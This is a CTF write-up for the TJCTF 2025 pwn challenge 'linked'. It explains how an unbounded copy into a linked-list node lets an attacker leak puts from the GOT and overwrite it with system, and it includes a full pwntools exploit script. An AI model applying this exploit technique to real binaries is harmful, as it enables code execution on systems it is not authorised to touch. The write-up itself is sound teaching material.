# TJCTF 2025  /  pwn  /  linked  /  challenge writeup
**CTF Platform**: TJCTF 2025 

**Category**: pwn

**Writeup by** zilmoe

---

## 🧩 Challenge Description
> "I've been learning about linked lists in my data structures class so I tried implementing one in my calendar app" 

>Provided files: chall (binary), chall.c (source code), libc.so.6 (libc source and version), Dockerfile

>These have also been uploaded to the github repo where this writeup is posted.

---

## Introduction
I  enjoyed playing in this CTF, however, this challenge was the one that gave me the most trouble.I wrote this small write-up to help anyone that was still struggling and to document how I did it. As a side note, I am using gdb with gef, a gdb enhancer that makes solving challenges easier (at least for me!). Highly reccomend for people doing pwn.

## 🛠️ Solution

The first thing I noticed in this challenge was that they provided a libc file. From this I suspected that there would be some kind of libc leak / GOT overwrite so I checked the protections on the binary by running it in GDB with `gdb ./chall` and then using the command `checksec`.

```
Checksec output:
Canary                        : ✓ (value: 0x42f9a3ebe4ff2200)
NX                            : ✓
PIE                           : ✘
Fortify                       : ✘
RelRO                         : Partial
```
From the output we can see that RelRo has been partially turned on. This means that some parts of the GOT table are still marked as "writeable", which is good for us since we can call arbitrary functions this way. 

---

### What is the GOT table?
The GOT table is a method of lazy loading functions during binary compilation. Think of it this way, the compiler doesn't know the locations of the libc functions within the libc file so instead it uses the PLT to make a "placeholder" address that gets replaced during run-time when the function is called. Let's take a look at the GOT table for this binary in gdb. We can do this by loading the file in gdb once again `gdb ./chall`, and then typing `start`. Gdb should automatically pause somewhere before the main function. This is fine for us. Type in `got` to view the got table for this binary. 

```
GOT protection: Partial RelRO | GOT functions: 8

[0x404000] free@GLIBC_2.2.5  →  0x401030
[0x404008] puts@GLIBC_2.2.5  →  0x401040
[0x404010] __stack_chk_fail@GLIBC_2.4  →  0x401050
[0x404018] setbuf@GLIBC_2.2.5  →  0x401060
[0x404020] printf@GLIBC_2.2.5  →  0x401070
[0x404028] fgets@GLIBC_2.2.5  →  0x401080
[0x404030] malloc@GLIBC_2.2.5  →  0x401090
[0x404038] atoi@GLIBC_2.2.5  →  0x4010a0
```

You can't tell from the write-up, but all of these functions should be yellow. This is gdb's way of telling us that these GOT functions still point to the plt stub. The plt stub is the code that replaces the "placeholder" address with the real address of the function that we were talking about earlier. Above we can see these "placeholder" addresses, which are also the plt stub address. From here just type `disas main` to disassemble the main function. Luckily, since we were given the source code, we won't have to look at too much assembly but set a breakpoint with `b *0x00000000004014c6` somewhere in the middle of the funtion and then type `c`. 

Now, when we look at the GOT table it looks a little different:
```
GOT protection: Partial RelRO | GOT functions: 8

[0x404000] free@GLIBC_2.2.5  →  0x401030
[0x404008] puts@GLIBC_2.2.5  →  0x7ffff7e24da0
[0x404010] __stack_chk_fail@GLIBC_2.4  →  0x401050
[0x404018] setbuf@GLIBC_2.2.5  →  0x7ffff7e2c940
[0x404020] printf@GLIBC_2.2.5  →  0x401070
[0x404028] fgets@GLIBC_2.2.5  →  0x401080
[0x404030] malloc@GLIBC_2.2.5  →  0x7ffff7e49610
[0x404038] atoi@GLIBC_2.2.5  →  0x4010a0
```
Some of the addresses have changed! These new addresses are the locations of the functions within the libc file that have replaced the plt stub. For example, this means that at one point in our program, puts was called. The program followed the plt stub and replaced the location of puts in the GOT table with its actual address in the libc file. Then, it was called normally. As a final note, we can see that the addresses that have been replaced are green! This is gdb's way of telling us that the got table has been changed and points to the actual function code in the libc file. If you want to explore this topic more, there are videos attached to the end of this writeup that helped me the most when learning this. Additionally, you can use the `vmmap` command within gdb to view the binary's memory map. You'll be able to see the differences to where the got table points to and how it works.

---

Back to the checksec output we can also see that the canary is turned on, which means that there is no stack buffer overflow, or if there is, we would need some way of leaking the canary value. The canary value is placed at the bottom of the stack and checked to ensure that no one has overwritten the return address. If it has been overwritten, the program will normally stop execution.

Finally, PIE has been turned off, which means our code's base address will stay the same throughout runs and make our lifes much easier.

Now that we have some idea of what the vulnerability/exploit will entail we can check the source code.

```c
int main() {
    char inputBuffer[256] = {'\0'};
    struct eventList events;
    events.head = malloc(sizeof(struct event));
    events.head->next = NULL;
    events.head->time = 0;
    events.size = 1;

    setbuf(stdout, NULL);

    for (int i = 0; i < 2; i++) {
        puts("Add an event to your calendar:");

        struct event *cur = events.head;
        while (cur->next != NULL) {
            cur = cur->next;
        }
        cur->next = malloc(sizeof(struct event));
        cur->next->next = NULL;
        cur->next->time = 0;
        events.size++;

        printf("Event time? (1-24) ");
        fgets(inputBuffer, sizeof(inputBuffer), stdin);
        int t = atoi(inputBuffer);
        if (t == 0) {
            free(cur->next);
            cur->next = NULL;
            events.size--;
            printf("Invalid integer: %s\n", inputBuffer);
            continue;
        }
        cur->time = t;

        printf("Event name? ");
        fgets(inputBuffer, sizeof(inputBuffer), stdin);
        inpcpy(cur->name, inputBuffer);

        displayEvents(&events);
    }

    puts("2 events and still couldn't get the flag?");
    puts("smhmh");
    puts("just run like...");
    puts("cat flag.txt");
    puts("or something like that");
    return 0;
}
```

When checking main the first red flag that I noticed was the `puts("cat flag.txt");` function call. This in combination with the partial RelRo means that if we could somehow replace the GOT table entry of puts to point to the libc function system instead, we would have `system("cat flag.txt");`, which does exactly what it sounds like. 

From here I spent as much time as I needed understanding the program. I would run the binary many times with the source code next to it to get a full idea of how the code interacted with the user. I will explain my general mindset but nothing beats trying it out for yourself. 

We can see that main enters and defines a eventList struct along with declaring a inputBuffer of considerable size (256 bytes!). Then we see a for loop that will always run twice. Here we can see that the while loop will traverse to the end of the linked list.

---

### An idea of the linked list
A linked list is a data structure that sounds similar to what it is. We can see the definitions of the structs at the top of the file.
```c
struct event {
    int time;
    char name[128];
    struct event *next;
};

struct eventList {
    int size;
    struct event *head;
};
```
A linked list is made up of nodes that will point to the next node in the list. The first node is pointed to by the eventList struct, which also keeps track of the size of the list. To give a broad sense of what is happening, the program allocates the first node in the linked list, and sets its fields. 
Here it is step by step: 

```c
struct eventList events; 
```
The events variable is now a pointer to a eventList structure.

```c
events.head = malloc(sizeof(struct event)); 
```
The head field of the eventList now points to a linked list node.

```c
    events.head->next = NULL;
    events.head->time = 0;
    events.size = 1;
```

This initialized all the undefined memory that we are using. Linked lists are normally null terminated, which means the last item in the linked list will point to null. This is useful in a few scenarios, namely travering the linked list. 

Hopefully this gave you a pretty clear idea of how to think about the lists if you are new to them but if not there are many resources online that are exetremely helpful. 

---

From here we can see that another node is added to the linked list and our input is used to fill the name and time fields of the node. Most of this looks pretty standard until you get to the `inpcpy(cur->name, inputBuffer);` function call. Taking a look at the function:

```c
void inpcpy(char *dst, char *src) {
    int ind = 0;
    while (src[ind] != '\n') {
        dst[ind] = src[ind];
        ind++;
    }
}
```
This function copies the bytes from src, to dst until it encounters a newline character. This is vulnerable because you will never know for sure how many bytes the function is writing. We can see that it will copy bytes from the inputBuffer into a node's name field. Since the function doesn't keep track of the input size, we can overflow cur's name field and go into the next* field, which points to the next node in the linked list. Refer to the struct definition above for clarification. 

A simple run and seg fault confirms that we have access to the next* field. 
```
❯ ./linked
Add an event to your calendar:
Event time? (1-24) 1
Event name? AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Calendar events:
1:00 - AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
zsh: segmentation fault (core dumped)  ./linked
```

Finally, we have `displayEvents`, which will print out each event in the linked list and then update curr to the next item in the linked list. 
```c
void displayEvents(struct eventList *events) {
    puts("Calendar events:");

    struct event *cur = events->head;
    for (int i = 0; i < events->size; i++) {
        if (cur->time == 0) {
            break;
        }
        printf("%u:00 - %s\n", cur->time, cur->name);
        cur = cur->next;
    }
    printf("\n\n");
}
```

From here, we need a few things:
1. To leak a libc address from the GOT table.
2. Use the leak to calculate the address of system within the libc file.
3. Overwrite the GOT entry of puts with system. 

The reason why we need to leak a libc address is that the base address of the libc file changes every time due to the ASLR protection that is enabled by default on most systems. 99% of the time it will be running. In that case, we need to find a address and do the math for the actual libc base of that runtime. 

Since the offsets to functions like puts and system never change, it will be relatively simple to calculate. Pwntools also includes a few tools to make this easier.

Now for the actual exploit. 
We can send 128 arbitrary bytes to fill the name field. Then, we send the address of the GOT entry for puts, which we found earlier with the `got` command. This will make the next* field for cur point to the location of puts in GOT instead of an actual node for a linked list. 

```python
p.recv()
p.sendline(b"1")
p.recv()
p.sendline(b"l" * 128 + p32(0x1337) + p64(0x404008))
p.recvuntil(b"ll7\x13\n")
data = p.recvline()
```

If we continue running the binary, the `displayEvents` function will see the first calendar event and print it. However, since we changed the next* field, it will see a non-empty int field and continue printing.

```
1:00 - llllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllll7\x13
3607693136:00 - \x85|
```
This is the output from the `displayEvents` function. Since curr->next points to the GOT entry, the first 4 bytes are interpreted as the time field, and the rest as the name field. With some wonky code we can reconfigure the leaked puts address. 

```python
def parse_leaked_address(line):
    leaked = line.split(b":00 - ")[1].strip()
    leaked = leaked.split(b"\n")[0]
    loc = str(line).find(":00")
    addr_rest = str(line)[2:loc]
    return int(str(hex(u64(leaked.ljust(8, b'\x00')))) + str(hex(int(addr_rest)))[2:], 0)
```

Once `displayEvents` finishes, it updates curr to point to curr->next with this line:
```
cur = cur->next;
```

So now, curr points to our GOT entry of puts. This is good as now when the binary asks for our input, it will be overwriting the value stored in the GOT table. We will just have to calculate the system address and parse it so we can send the time and name that fit. Just like before, 4 bytes are turned into time and the last two are used for name. 

```python
leaked_puts = parse_leaked_address(data)
print(hex(leaked_puts))
libc = ELF("libc.so.6")

print(f"LEAKED puts ADDR {hex(leaked_puts)}")

libc_base = leaked_puts - libc.sym["puts"]
system_addr = libc_base + libc.sym["system"]

print(f"CALCULATED LIBC BASE: {hex(libc_base)}")
print(f"CALCULATED SYSTEM ADDR {hex(system_addr)}")

top_digits = str(hex(system_addr))[2:6]
parsed_digits = bytes.fromhex(top_digits)[::-1]
print(parsed_digits)
bottom_digits = int(str(hex(system_addr))[6:], 16)
print(bottom_digits)

p.recvuntil(b"time? (1-24) ")
p.sendline(str(bottom_digits).encode())

p.recvuntil(b"Event name?")
p.sendline(parsed_digits)

p.interactive()
```

At the end, the program continues executing and `puts("cat flag.txt")` is now `system("cat flag.txt")`. This is because the GOT table will point to the code for system instead of puts since we overrode the address.

```
sh: 1: Syntax error: Unterminated quoted string
sh: 1: smhmh: not found
sh: 1: just: not found
tjctf{i_h0pe_my_tre3s_ar3nt_b4d_too}sh: 1: or: not found
```

final script:
```python
from pwn import *

#puts address location: 0x404008

context.terminal = ["alacritty", "-e"]

host = "tjc.tf"
port = 31509
p = remote(host, port)
#p = process("./chall")
#gdb.attach(p)

def parse_leaked_address(line):
    leaked = line.split(b":00 - ")[1].strip()
    leaked = leaked.split(b"\n")[0]
    loc = str(line).find(":00")
    addr_rest = str(line)[2:loc]
    return int(str(hex(u64(leaked.ljust(8, b'\x00')))) + str(hex(int(addr_rest)))[2:], 0)

p.recv()
p.sendline(b"1")
p.recv()
p.sendline(b"l" * 128 + p32(0x1337) + p64(0x404008))
p.recvuntil(b"ll7\x13\n")
data = p.recvline()

print(f"LEAKED DATA = {data}")

leaked_puts = parse_leaked_address(data)
print(hex(leaked_puts))
libc = ELF("libc.so.6")

print(f"LEAKED puts ADDR {hex(leaked_puts)}")

libc_base = leaked_puts - libc.sym["puts"]
system_addr = libc_base + libc.sym["system"]

print(f"CALCULATED LIBC BASE: {hex(libc_base)}")
print(f"CALCULATED SYSTEM ADDR {hex(system_addr)}")

top_digits = str(hex(system_addr))[2:6]
parsed_digits = bytes.fromhex(top_digits)[::-1]
print(parsed_digits)
bottom_digits = int(str(hex(system_addr))[6:], 16)
print(bottom_digits)

p.recvuntil(b"time? (1-24) ")
p.sendline(str(bottom_digits).encode())

p.recvuntil(b"Event name?")
p.sendline(parsed_digits)

p.interactive()
```
Extra material on GOT tables:

https://www.youtube.com/watch?v=kUk5pw4w0h4

https://www.youtube.com/watch?v=B4-wVdQo040&t=747s
